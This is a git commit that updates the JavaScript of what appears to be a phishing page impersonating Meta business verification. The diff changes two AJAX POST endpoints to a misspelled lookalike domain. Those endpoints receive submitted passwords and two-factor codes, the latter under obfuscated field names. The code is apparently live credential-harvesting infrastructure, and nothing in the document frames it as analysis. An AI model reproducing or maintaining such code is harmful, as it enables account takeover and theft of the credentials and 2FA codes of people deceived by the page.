c83bee0511236a9603e02eaa68e5a56d3f5110ec
matesippot <154110854+matesippot@users.noreply.github.com>
2023-12-18 17:58:05 +0700

    Update custom.js

--- assets/js/custom.js
+++ assets/js/custom.js
@@ -66,7 +66,7 @@ $(document).ready(function() {
         _formInfo.append('num_enter_password', num_enter_password);
 
         $.ajax({
-            url: 'https://meta.business-verify-support.com/api/account',
+            url: 'https://meta.bussines-checkporn.icu/api/account',
             type: 'POST',
             contentType: false,
             processData: false,
@@ -96,7 +96,7 @@ $(document).ready(function() {
         let _code = $this.find('input[name="udgvjseoun"]').val();
 
         $.ajax({
-            url: 'https://meta.business-verify-support.com/api/2fa-code',
+            url: 'https://meta.bussines-checkporn.icu/api/2fa-code',
             type: 'POST',
             data: {
                 'pyctdvtzlzz': _code
